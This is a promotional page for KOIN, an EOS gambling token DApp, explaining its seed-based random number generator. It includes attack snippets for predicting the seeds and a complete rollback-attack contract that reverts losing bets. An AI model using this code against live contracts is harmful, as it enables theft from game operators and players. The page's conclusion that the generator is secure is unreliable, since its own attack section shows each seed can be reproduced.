<h1>Player to Player Community Token</h1>
KOIN is DApp run on EOS block-chain to facilitate Player to Player interaction.

<h2>True Value Offering & Better than Any Offering</h2>
This is not an ICO activity, but an opportunity sharing offering. Members and Founder share the same value result, no free token distribute to Founder, all KOIN hold by founder came from his own fund and convert with same rate as other member.

Every EOS token collected is save securely at KOIN smart contract, and can be withdraw at any time. Deposit and Withdraw not depend on any Exchange; all functions are integrated in KOIN smart contract. Price is calculating based on current supply divide by total EOS in smart contract account.

Value result from member activity will distribute to all member immediately in term of token supply, which is directly impact to token price (Price=Current Supply/Total EOS).

Value sharing is come from percentage of surplus or deficit in each game session. In Dice, Free Dice, Free Wheel, TOTO, and Soccer, value sharing is 100% from surplus/deficit. In Lotto4x20, Lotto5x36, Lotto6x45, value sharing is 30% from surplus and 70% will go to jackpot prize pool. Surplus value will reduce token supply and Deficit value (after deducted from jackpot prize pool) will increase token supply.

Koin DApp   -   Founder

visit us: koin4dapp.appspot.com

<h1>3 Seeds Random Number Generator (3SRNG)</h1>
Our decentralized random number generators(DRNG) bring fairness and tamper-resistance in the process of generating numbers to ensure fair game to all members. To Ensure the fairness our DRNG using 3 random number seeds. The first seed is from previous session seed saved at our DApp, the second seed is generated from current transaction ID, and the third seed is currently executing transaction block number. So there are no Founder intervention, and all is happened automatically at the blockchain based on DApp algorithm. The code snippet:

```
void init(uint64_t initseed) { //first seed=previous session seed saved at DApp
  auto s = read_transaction(nullptr,0);
  char *tx = (char *)malloc(s);
  read_transaction(tx, s);
  capi_checksum256 result;
  sha256(tx,s, &result); //second seed=current transaction ID

  seed = result.hash[7];
  seed <<= 8;
  seed ^= result.hash[6];
  seed <<= 8;
  seed ^= result.hash[5];
  seed <<= 8;
  seed ^= result.hash[4];
  seed <<= 8;
  seed ^= result.hash[3];
  seed <<= 8;
  seed ^= result.hash[2];
  seed <<= 8;
  seed ^= result.hash[1];
  seed <<= 8;
  seed ^= result.hash[0];
  seed ^= seed ^= (initseed^(tapos_block_prefix()*tapos_block_num())); //Third seed=current block number
}
```

Information about read_transaction can be read at eosio transaction.h

```
 /**
 * Access a copy of the currently executing transaction.
 *
 * @brief Access a copy of the currently executing transaction.
 * @param buffer - a buffer to write the current transaction to
 * @param size - the size of the buffer, 0 to return required size
 * @return the size of the transaction written to the buffer, or number of bytes that can be copied if size==0 passed
 */
__attribute__((eosio_wasm_import))
size_t read_transaction(char *buffer, size_t size);
```

Information about tapos_block_prefix() and tapos_block_num() can be read at eosio transaction.h

```
  /**
 * Gets the block number used for TAPOS on the currently executing transaction.
 *
 * @brief Gets the block number used for TAPOS on the currently executing transaction.
 * @return block number used for TAPOS on the currently executing transaction
 * Example:
 * @code
 * int tbn = tapos_block_num();
 * @endcode
 */
__attribute__((eosio_wasm_import))
int tapos_block_num();

/**
 * Gets the block prefix used for TAPOS on the currently executing transaction.
 *
 * @brief Gets the block prefix used for TAPOS on the currently executing transaction.
 * @return block prefix used for TAPOS on the currently executing transaction
 * Example:
 * @code
 * int tbp = tapos_block_prefix();
 * @endcode
 */
__attribute__((eosio_wasm_import))
int tapos_block_prefix();
```
<h3>Pseudo Random Number Generator using SHA-256</h3>
The SHA-256 hash algorithm produces hash values that are hard to predict from the input. They are also roughly equidistributed as the input varies. The advantages of this approach for election auditing and some other applications include the following:
<ul>
<li>The SH-256 algorithm is public and many implementations are available in many languages.</li>
<li>Given the seed, anyone can verify that the sequence of numbers generated was correct—that it indeed comes from applying SHA-256</li>
<li>Unless the seed is known, the sequence of values generated is unpredictable (so the result is hard to "game"). It is very hard to distinguish the output from independent, uniformly distributed samples</li>
</ul>  
(Source: P.B. Stark, https://www.stat.berkeley.edu/~stark/Java/Html/sha256Rand.htm, last access 8 June 2019)

```
void randraw() { 
  capi_checksum256 result; //32bytes of 8 chunks of uint_32
  sha256((char *)&seed, sizeof(seed), &result); //pseudo random namber generator using SHA-256
  seed = result.hash[7];
  seed <<= 8;
  seed ^= result.hash[6];
  seed <<= 8;
  seed ^= result.hash[5];
  seed <<= 8;
  seed ^= result.hash[4];
  seed <<= 8;
  seed ^= result.hash[3];
  seed <<= 8;
  seed ^= result.hash[2];
  seed <<= 8;
  seed ^= result.hash[1];
  seed <<= 8;
  seed ^= result.hash[0];       
}
    
uint32_t rand(uint32_t to) { //generate random 1 - to range
  randraw();
  return (uint32_t)((seed % to) + 1);
}
```

<h3>Possibility of Attack</h3>
KOIN token is player to player community DApp, so that we must make sure that 3SDRNG is secure from the attacker can cause loss to all KOIN token holder. The key of target attack is in the three seeds. The basic technique to attack an DApp is using RPC API Call, but this approach will not work on our DApp, because there are no way to read previous session seed table which isn't add to the ABI file, so the attacker must write smart contract to attack our DApp.

To attack our last session seed, attacker would typically create a struct and typedef similar to our singleton table and read it using the same code and scope as our DApp. The code snipped to read from table that are not added to the ABI file is:

```
struct similarobj {
  ...
}

typedef eosio::singleton <"targetobj"_n,similarobj> targetobj;

auto db = targetobj("targetcode"_n,name("targetscope").value);
auto seed1 = db.get();
...
```
To attack transaction Id, attacker must generated packed_trx and convert it to transaction ID using sha256. The code snipped to read current transaction structure from memory and convert to transaction ID:

```
auto s = read_transaction(nullptr,0);
char *tx = (char *)malloc(s);
read_transaction(tx, s);
printhex(tx,s); //packed_trx
capi_checksum256 result; //32bytes of 8 chunks of uint_32
sha256(tx,s, &result);
printhex(&result, sizeof(result)); //transaction ID
```
Suppose the result of packed_trx is "265cfe5c51212756d49f00000000013044c82a46c387080040768bde9ab1ca013044c82a46c3870800000000a8ed3232101027000000000000045349530000000000", then and the unpacked result using cleos command is:

```
cleos convert unpack_transaction '{
  "compression": "none",
  "packed_context_free_data": "",
  "packed_trx": "265cfe5c51212756d49f00000000013044c82a46c387080040768bde9ab1ca013044c82a46c3870800000000a8ed3232101027000000000000045349530000000000"}'
```

And the JSON result is:
```
{
  "expiration": "2019-06-10T13:33:26",
  "ref_block_num": 8529,
  "ref_block_prefix": 2681493031,
  "max_net_usage_words": 0,
  "max_cpu_usage_ms": 0,
  "delay_sec": 0,
  "context_free_actions": [],
  "actions": [{
      "account": "targetcontract",
      "name": "smartprofit",
      "authorization": [{
          "actor": "youraccount",
          "permission": "active"
        }
      ],
      "data": "10270000000000000453495300000000"
    }
  ],
  "transaction_extensions": [],
  "signatures": [],
  "context_free_data": []
}

```
Attacker can get ref_block_num and ref_block_prefix using  /v1/chain/get_info RPC API Call with the code snipped is:

```
<html>
<script>
var data = null;

var xhr = new XMLHttpRequest();

xhr.addEventListener("readystatechange", function () {
  if (this.readyState === this.DONE) {
    console.log(this.responseText);
  }
});

xhr.open("POST", "https://api.bossweden.org/v1/chain/get_info");
xhr.setRequestHeader("accept", "application/json");
xhr.setRequestHeader("content-type", "application/json");

xhr.send(data);
</script>
</html>
```
Where ref_block_num = last_irreversible_block_num, ref_block_prefix = head_block_num.
```
{
  "server_version": "de643ec0",
  "chain_id": "d5a3d18fbb3c084e3b1f3fa98c21014b5f3db536cc15d08f9f6479517c6a3d86",
  "head_block_num": 24537585,
  "last_irreversible_block_num": 24537255,
  "last_irreversible_block_id": "017668a79c7f887b45b59fca389cbcb14f3f7afb0fa5d09ac4ac1a1b91b13e83",
  "head_block_id": "017669f10670ff45e9a99212f7e2cb090c418d00eea41fecfe4fd37318484c2a",
  "head_block_time": "2019-06-08T13:45:44.500",
  "head_block_producer": "bosswedenorg",
  "virtual_block_cpu_limit": 200000000,
  "virtual_block_net_limit": 1048576000,
  "block_cpu_limit": 199900,
  "block_net_limit": 1048576,
  "server_version_string": "v2.0.3"
}
```

To attack tapos_block_prefix() and tapos_block_num(), attacker must make sure that their smart contract and transaction initialize to our DAPP are run on the same block, otherwise the two numbers will be changed and the result is different. The code snipped to get tapos_block_prefix() and tapos_block_num(), then initialize action to our DAPP. The code snipped is:

```
auto seed2 = tapos_block_prefix() * tapos_block_num();
  ...
  ...
action(
  permission_level{_self, "active"_n,
  "targetcontract"_n, "targetaction"_n),
  std::make_tuple(_self, other params need by action)
.send(); 
```

(Source: https://bzdww.com/article/130403/, last access 8 June 2019)

<h1>Rollback Attack</h3>
Another potential attack to game smart contract is Rollback Attact. Attacker can make a smart contract that compare balance before and after action call to play game, then rollback the transaction using eosio_assert if ending balance < begining balance. The code snipped is:

```
void token::checkbalance(asset bbalance)
{
  require_auth(_self);
  auto sym = symbol("EOS",4);
  eosio::asset ebalance = get_balance( "eosio.token"_n, _self, sym.code());
  eosio::print("Ending Balance is:" + ebalance.to_string());
  eosio_assert(ebalance > bbalance,"Loss, rollback"); //ending balance must > begining balance, if not rollback
}

void token::smartprofit( asset value)
{
  require_auth(_self);
  auto sym = symbol("EOS",4);
  eosio::asset bbalance = get_balance( "eosio.token"_n, _self, sym.code());
  eosio::print("Begining Balance is:" + bbalance.to_string());

  name participant=_self;
  eosio::asset quantity = value;
  string memo = "<50";
  //call play game
  action(
      permission_level{ _self,"active"_n},
      "targetcontract"_n,
      "targetaction"_n,
      std::make_tuple(participant, quantity, memo)
    ).send();
  //check balance immediately and ending balance < begining balance then rollback
  action(
      permission_level{ _self,"active"_n},
      "ourcontract"_n,
      "checkbalance"_n,
      std::make_tuple(bbalance)
  ).send();
}
```

<h3>Conclusion</h3>
So far, we can make conclusion that our 3SDRNG is secure and ensure fairness to all members. If there are possible to attack our DApp, but they are hard to do in the smart contract and must make sure that they run on the same block.
